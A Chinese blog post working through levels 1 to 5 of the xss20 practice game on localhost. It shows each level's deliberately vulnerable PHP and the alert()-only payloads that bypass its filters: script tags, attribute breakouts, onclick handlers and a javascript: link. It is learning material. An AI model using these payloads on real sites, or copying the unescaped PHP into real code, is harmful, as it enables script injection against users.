<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">







  
  
  <link rel="stylesheet" media="all" href="/lib/Han/dist/han.min.css?v=3.3">




<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">


  <link rel="manifest" href="/images/manifest.json">




  <meta name="keywords" content="XSS20,xss,">





  <link rel="alternate" href="/atom.xml" title="煊奕" type="application/atom+xml">






<meta name="description" content="人生没有白走的路，每一步都算数">
<meta name="keywords" content="XSS20,xss">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS学习之xss20">
<meta property="og:url" content="https://clwsec.top/2019/03/30/XSS学习之xss20/index.html">
<meta property="og:site_name" content="煊奕">
<meta property="og:description" content="人生没有白走的路，每一步都算数">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-2e90d4973c1489e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-8486773b99a5508b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-3be3c68da6805921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-3d0cf6199d3876bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-9a75d4dcedaa2537.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-a3ccdbcacd47f8bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-bf45c24c5f871a34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-78893a7397ded325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-c41e526f63b344d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-6fd15cfe1f095d31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-1d281e0e32752d68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-0c2c22486aa57466.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-aa5367baad70e3ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-8f48ad7e440bc9b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-9cbe735e4ce6931f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-6cce36732763289e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-ecf0ceeb7b772072.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-743c241d7e59af70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-aba6fefafb96038e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-f7560d5b3f943184.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-1dd416521f5d5eed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-c524fe709551c77c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-171cf3d033c7c5e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-18d549eab33ac2d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-855e56d2b724bd7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-b8642fd0c5aff1b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-a3f040b860570054.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-ac8238c71084f0e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-2788f9dab2b37f59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-3996cc65b58901a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-127d45e9739197bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-a0a6b12693e12f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-a5e04a0cf5cb4163.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-9cf3d30a272e95d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-1f0c05ba90f2d851.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-295e623ecb39242c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-0c8683ee5bbe69dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-4f7e8df54b7ef41d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-2066071becfc08b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-579a2fb35d70da91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-9566166e0fb23935.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-ba31244ee3104344.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-ef95b0c6e36ee452.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-c05a640ade3c64dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-01a21d39529a3853.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-004a201a9aef4f5c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-85d3110e122be577.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-c8f12972b79d831c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-96c7b6a717e30caa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:updated_time" content="2019-04-01T15:53:16.899Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="XSS学习之xss20">
<meta name="twitter:description" content="人生没有白走的路，每一步都算数">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9216631-2e90d4973c1489e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":10,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://clwsec.top/2019/03/30/XSS学习之xss20/">





  <title>XSS学习之xss20 | 煊奕</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">煊奕</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">No pains No gains</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-链接">
          <a href="/links/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            链接
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://clwsec.top/2019/03/30/XSS学习之xss20/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="lei">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="煊奕">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">XSS学习之xss20</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-30T20:08:17+08:00">
                2019-03-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.7k
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        <blockquote class="blockquote-center">人生没有白走的路，每一步都算数</blockquote>

<a id="more"></a>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是比较简单的xss练习小游戏，非常适合入门。一直以来，对xss的内容总感觉有一些屏障，应该是因为动手实践太少。所以，趁此机会，好好学习一番，打好基础，以后再继续深入。</p>
<h3 id="关于xss"><a href="#关于xss" class="headerlink" title="关于xss"></a>关于xss</h3><p>1.概念：XSS攻击全称<a href="https://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/8186208" target="_blank" rel="noopener">跨站脚本攻击</a>（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞。其是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
<p>2.分类：</p>
<ul>
<li>反射型 XSS：攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</li>
<li>持久型 XSS：也叫存储型跨站脚本，此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</li>
<li>DOM XSS：DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，受客户端浏览器的脚本代码所影响。</li>
</ul>
<p>3.利用：</p>
<ul>
<li>Cookies 窃取 ：获取客户端的 Cookies 信息</li>
<li>会话劫持 ：接管现存的动态会话的过程</li>
<li>钓鱼 ：包括重定向钓鱼、HTML 注入式钓鱼、iframe 钓鱼、Flash 钓鱼等</li>
<li>网页挂马：一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 <code>&lt;iframe&gt;</code>标签。</li>
<li>DOS 与 DDOS：注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</li>
<li>XSS 蠕虫 ：通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</li>
</ul>
<hr>
<h3 id="开始实践"><a href="#开始实践" class="headerlink" title="开始实践"></a>开始实践</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>URL中有一个<code>name</code>参数，既然是练习xss，直接使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，即 <code>http://localhost/xss/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code> 成功。</p>
<p>查看关键代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>直接输出，没有任何过滤，所以可执行。再看看提交信息：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-2e90d4973c1489e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>本来为用户名的内容被执行。</p>
<hr>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p>1.使用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试试，未成功，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-8486773b99a5508b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>即<code>&lt;</code>和<code>&gt;</code>都被转义了，查看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>使用了<code>htmlspecialchars($str)</code>函数，这个函数的作用是把一些预定义的字符转换为 HTML 实体。<br>预定义字符包括：</p>
<ul>
<li><code>&amp; （和号）成为 &amp;amp;</code></li>
<li><code>&quot; （双引号）成为 &amp;quot;</code></li>
<li><code>&#39; （单引号）成为 &#39;</code></li>
<li><code>&lt; （小于）成为 &amp;lt;</code></li>
<li><code>&gt; （大于）成为 &amp;gt;</code></li>
</ul>
<p>注：要把特殊的 HTML 实体转换回字符，请使用 <a href="http://www.runoob.com/php/func-string-htmlspecialchars-decode.html" target="_blank" rel="noopener">htmlspecialchars_decode()</a> 函数。</p>
<p>2.<code>htmlspecialchars($str)</code>函数的语法为：<code>htmlspecialchars(string,flags,character-set,double_encode)</code> 主要看前面两个参数：<br><code>string</code>：必需，规定要转换的字符串。<br><code>flags</code>：可选，规定如何处理引号、无效的编码以及使用哪种文档类型。这个参数主要看可用的引号类型：</p>
<ul>
<li><code>ENT_COMPAT</code> - 默认。仅编码双引号。</li>
<li><code>ENT_QUOTES</code> - 编码双引号和单引号。</li>
<li><code>ENT_NOQUOTES</code> - 不编码任何引号。</li>
</ul>
<p>关于其他内容，可查看：<a href="http://www.runoob.com/php/func-string-htmlspecialchars.html" target="_blank" rel="noopener">PHP htmlspecialchars() 函数</a></p>
<p>3.知道了<code>htmlspecialchars($str)</code>函数的作用，那该如何绕过并执行呢。其实这题还用不到它。可以看到，只在输出处进行了转义，在输入处可利用。可将<code>input</code>标签提前闭合。构造：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</code> 成功。解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-3be3c68da6805921.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<hr>
<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>1.提交上一关的payload，发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-3d0cf6199d3876bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>看来这次是两处都进行了HTML实体转换。看看源码，的确如此，值得注意的为单引号闭合。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
<p>2.不过，还有有很多JS事件可以利用。这里列举几个：<br>onmouseenter=alert() //当鼠标移动到就会触发<br>onclick=alert() //鼠标点击时就会触发<br>onchange=alert() //在域的内容改变时发生<br>oninput=alert() //在用户输入时触发<br>onmouseover=alert()//鼠标移动到就会触发</p>
<p>注意：只有在<code>htmlspecialchars($str)</code>函数未指定第二个参数flag时，即<code>ENT_COMPAT</code> 时，可用于闭合单引号情况的输入。如：此次输入的<code>value</code>就是单引号闭合</p>
<p>3.使用<code>1&#39;onclick=&#39;window.alert()</code>试试，成功<br><img src="https://upload-images.jianshu.io/upload_images/9216631-9a75d4dcedaa2537.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<hr>
<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p>1.先提交上题的<code>1&#39;onclick=&#39;window.alert(1)</code>试试，发现闭合为双引号：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-a3ccdbcacd47f8bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>2.改用双引号，<code>1&quot;onclick=&quot;window.alert(1)</code>成功。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-bf45c24c5f871a34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>发现这个题也是没有在输入处进行HTML实体转换。可以看看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里多了对<code>&lt;</code>和<code>&gt;</code>的过滤<code>$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</code> <code>$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</code> 但我们所构造的也已经绕过了。</p>
<hr>
<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>1.提交上题的payload,发现：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-78893a7397ded325.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>这种过滤比较麻烦，不好绕过。先试试大小写:<code>1&quot;Onclick=&quot;window.alert(1)</code> 没用，提示同样的错误。</p>
<p>2.说明带有on的事件都不可以使用了，测试发现<code>&lt;script</code>也不可用(前面的<code>script</code>变了，但后面的没变，说明不是针对<code>script</code>，而是<code>&lt;script</code>)。<br><img src="https://upload-images.jianshu.io/upload_images/9216631-c41e526f63b344d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>继续观察发现，在输入处并没有对<code>&lt;</code>和<code>&gt;</code>进行转义。所以，这里使用另一种方法：<code>javascript:alert(1)</code> 构造：<code>&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;try&lt;/a&gt;&quot;</code> 结果如下：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-6fd15cfe1f095d31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>点击插入的超链接，成功。查看解析为：<br><img src="https://upload-images.jianshu.io/upload_images/9216631-1d281e0e32752d68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>3.现在看看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>和猜测的一样，通过<code>strtolower($_GET[&quot;keyword&quot;]);</code>将输入转为小写，即无法大小写绕过。并通过<code>str_replace()</code>过滤<code>&lt;script</code>和<code>on</code> </p>
<hr>
